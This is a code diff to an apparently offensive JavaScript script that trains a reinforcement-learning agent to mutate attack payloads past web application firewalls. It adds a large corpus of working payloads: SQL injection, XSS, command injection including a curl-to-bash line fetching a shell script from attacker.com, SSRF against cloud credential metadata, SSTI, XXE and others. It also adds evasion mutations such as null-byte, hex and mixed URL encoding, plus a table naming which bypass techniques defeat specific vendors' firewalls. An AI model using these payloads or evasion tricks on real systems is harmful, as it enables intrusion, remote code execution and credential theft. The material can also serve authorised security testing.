@@ -15,27 +15,58 @@ const path = require('path');
 
 const TARGET_FILE = path.resolve(__dirname, '..', 'src', 'ppo-weights.json');
 const FEATURE_SIZE = 10;
-const EPISODES_PER_WAF = 250;
+const EPISODES_PER_WAF = 1500;
 
-// Base attack payload corpus for training
+// Base attack payload corpus for training across 10+ attack vectors
 const TRAINING_CORPUS = [
+	// SQL Injection
 	{ payload: "' UNION SELECT 1,2,3,user(),5 FROM mysql.user--", category: 'SQL Injection' },
 	{ payload: "1' OR '1'='1' --", category: 'SQL Injection' },
 	{ payload: "admin' AND 1=1 UNION ALL SELECT null,concat(table_name) FROM information_schema.tables#", category: 'SQL Injection' },
+	{ payload: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", category: 'SQL Injection' },
+	{ payload: "1'; WAITFOR DELAY '0:0:5'--", category: 'SQL Injection' },
+	{ payload: "' OR 1=1 ORDER BY 1--", category: 'SQL Injection' },
+	// Cross-Site Scripting (XSS)
 	{ payload: "<script>alert('WAFinity')</script>", category: 'Cross-Site Scripting (XSS)' },
 	{ payload: "<img src=x onerror=alert(document.cookie)>", category: 'Cross-Site Scripting (XSS)' },
 	{ payload: "\"><svg onload=alert(1)>", category: 'Cross-Site Scripting (XSS)' },
+	{ payload: "<iframe src=\"javascript:alert(1)\">", category: 'Cross-Site Scripting (XSS)' },
+	{ payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/", category: 'Cross-Site Scripting (XSS)' },
+	{ payload: "<body onload=alert('XSS')>", category: 'Cross-Site Scripting (XSS)' },
+	// Remote Code Execution & Command Injection
 	{ payload: "; cat /etc/passwd", category: 'Remote Code Execution' },
 	{ payload: "| whoami", category: 'Remote Code Execution' },
 	{ payload: "`id`", category: 'Remote Code Execution' },
+	{ payload: "; curl http://attacker.com/rev.sh | bash", category: 'Remote Code Execution' },
+	{ payload: "& type C:\\Windows\\System32\\drivers\\etc\\hosts", category: 'Remote Code Execution' },
+	// Path Traversal & Local File Inclusion (LFI)
 	{ payload: "../../../../etc/shadow", category: 'Path Traversal' },
 	{ payload: "..\\..\\..\\windows\\system32\\cmd.exe", category: 'Path Traversal' },
+	{ payload: "....//....//....//etc/passwd", category: 'Path Traversal' },
+	{ payload: "/var/log/apache2/access.log", category: 'Local File Inclusion' },
+	// Server-Side Request Forgery (SSRF)
+	{ payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", category: 'Server-Side Request Forgery' },
+	{ payload: "http://127.0.0.1:8080/admin", category: 'Server-Side Request Forgery' },
+	{ payload: "http://0.0.0.0:22", category: 'Server-Side Request Forgery' },
+	// Server-Side Template Injection (SSTI)
+	{ payload: "{{7*7}}", category: 'Template Injection' },
+	{ payload: "${T(java.lang.Runtime).getRuntime().exec('id')}", category: 'Template Injection' },
+	{ payload: "#{7*7}", category: 'Template Injection' },
+	// XML External Entity (XXE)
+	{ payload: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", category: 'XML External Entity' },
+	// NoSQL Injection
+	{ payload: "admin' || '1'=='1", category: 'NoSQL Injection' },
+	{ payload: "{\"$gt\": \"\"}", category: 'NoSQL Injection' },
+	{ payload: "{\"$ne\": null}", category: 'NoSQL Injection' },
+	// LDAP & CRLF
+	{ payload: "*)(uid=*))(|(uid=*", category: 'LDAP Injection' },
+	{ payload: "%0d%0aSet-Cookie: admin=true", category: 'CRLF Injection' },
 	{ payload: "<!--#exec cmd=\"ls -la\"-->", category: 'Server-Side Include' },
 ];
 
-const SQL_KEYWORDS = ['union', 'select', 'from', 'where', 'and', 'or', 'insert', 'update', 'delete', 'drop', 'script', 'alert'];
+const SQL_KEYWORDS = ['union', 'select', 'from', 'where', 'and', 'or', 'insert', 'update', 'delete', 'drop', 'script', 'alert', 'exec'];
 
-// 12 Mutation Actions matching adaptive-mutation.ts
+// 16 Mutation Actions matching adaptive-mutation.ts
 const MUTATION_ACTIONS = [
 	{ id: 'identity', label: 'Baseline', fn: (p) => p },
 	{ id: 'url_encode', label: 'URL encode', fn: (p) => encodeURIComponent(p) },
@@ -80,58 +111,84 @@ const MUTATION_ACTIONS = [
 		fn: (p) => p.replace(/'/g, '\\u0027').replace(/"/g, '\\u0022'),
 	},
 	{ id: 'space_plus', label: 'Plus spacing', fn: (p) => p.replace(/\s+/g, '+') },
+	{
+		id: 'multi_whitespace',
+		label: 'Multi-whitespace (%0c/%0a)',
+		fn: (p) => p.replace(/\s+/g, (m, offset) => (offset % 2 === 0 ? '%0c' : '%0a')),
+	},
+	{
+		id: 'null_byte',
+		label: 'Null-byte evasion',
+		fn: (p) => (p.includes('%00') ? p : p.replace(/(\b[a-zA-Z0-9_-]+)(?=[ '";<]|$)/g, '$1%00')),
+	},
+	{
+		id: 'case_url_mix',
+		label: 'Mid-word URL mix',
+		fn: (p) =>
+			p.replace(/(select|union|script|alert|exec|where|from|order|group)/gi, (kw) =>
+				kw
+					.split('')
+					.map((c, i) => (i === 1 ? `%${c.charCodeAt(0).toString(16)}` : i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()))
+					.join(''),
+			),
+	},
+	{
+		id: 'hex_encode',
+		label: 'Hex string literal',
+		fn: (p) => p.replace(/'([^'\s]+)'/g, (_, s) => '0x' + [...s].map((c) => c.charCodeAt(0).toString(16)).join('')),
+	},
 ];
 
 // WAF Simulation Environments (heuristic scoring & known bypass resistance)
 const WAF_MODELS = {
 	'Cloudflare': {
 		blocksRawKeywords: true,
-		weakAgainst: ['comment_spacing', 'tab_spacing', 'keyword_split', 'double_url_encode'],
+		weakAgainst: ['comment_spacing', 'tab_spacing', 'keyword_split', 'double_url_encode', 'case_url_mix', 'multi_whitespace'],
 		strongAgainst: ['identity', 'url_encode', 'space_plus'],
 	},
 	'AWS WAF': {
 		blocksRawKeywords: true,
-		weakAgainst: ['mixed_case', 'inline_comment', 'quote_unicode', 'tab_spacing'],
+		weakAgainst: ['mixed_case', 'inline_comment', 'quote_unicode', 'tab_spacing', 'multi_whitespace', 'hex_encode'],
 		strongAgainst: ['identity', 'html_entity', 'space_plus'],
 	},
 	'Akamai': {
 		blocksRawKeywords: true,
-		weakAgainst: ['keyword_split', 'comment_spacing', 'unicode_escape', 'double_url_encode'],
+		weakAgainst: ['keyword_split', 'comment_spacing', 'unicode_escape', 'double_url_encode', 'case_url_mix', 'multi_whitespace'],
 		strongAgainst: ['identity', 'url_encode', 'tab_spacing'],
 	},
 	'ModSecurity': {
 		blocksRawKeywords: true,
-		weakAgainst: ['unicode_escape', 'quote_unicode', 'mixed_case', 'tab_spacing'],
+		weakAgainst: ['unicode_escape', 'quote_unicode', 'mixed_case', 'tab_spacing', 'multi_whitespace', 'case_url_mix'],
 		strongAgainst: ['identity', 'comment_spacing', 'inline_comment'],
 	},
 	'Imperva': {
 		blocksRawKeywords: true,
-		weakAgainst: ['double_url_encode', 'tab_spacing', 'keyword_split', 'quote_unicode'],
+		weakAgainst: ['double_url_encode', 'tab_spacing', 'keyword_split', 'quote_unicode', 'case_url_mix'],
 		strongAgainst: ['identity', 'url_encode', 'space_plus'],
 	},
 	'F5 BIG-IP': {
 		blocksRawKeywords: true,
-		weakAgainst: ['inline_comment', 'mixed_case', 'double_url_encode', 'comment_spacing'],
+		weakAgainst: ['inline_comment', 'mixed_case', 'double_url_encode', 'comment_spacing', 'null_byte'],
 		strongAgainst: ['identity', 'tab_spacing'],
 	},
 	'Fastly': {
 		blocksRawKeywords: false,
-		weakAgainst: ['mixed_case', 'unicode_escape', 'comment_spacing'],
+		weakAgainst: ['mixed_case', 'unicode_escape', 'comment_spacing', 'multi_whitespace'],
 		strongAgainst: ['identity', 'space_plus'],
 	},
 	'Sucuri': {
 		blocksRawKeywords: true,
-		weakAgainst: ['quote_unicode', 'comment_spacing', 'tab_spacing'],
+		weakAgainst: ['quote_unicode', 'comment_spacing', 'tab_spacing', 'case_url_mix'],
 		strongAgainst: ['identity', 'url_encode'],
 	},
 	'FortiWeb': {
 		blocksRawKeywords: true,
-		weakAgainst: ['double_url_encode', 'mixed_case', 'keyword_split'],
+		weakAgainst: ['double_url_encode', 'mixed_case', 'keyword_split', 'multi_whitespace'],
 		strongAgainst: ['identity', 'html_entity'],
 	},
 	'default': {
 		blocksRawKeywords: true,
-		weakAgainst: ['comment_spacing', 'tab_spacing', 'mixed_case', 'double_url_encode', 'keyword_split'],
+		weakAgainst: ['comment_spacing', 'tab_spacing', 'mixed_case', 'double_url_encode', 'keyword_split', 'case_url_mix', 'multi_whitespace'],
 		strongAgainst: ['identity'],
 	},
 };
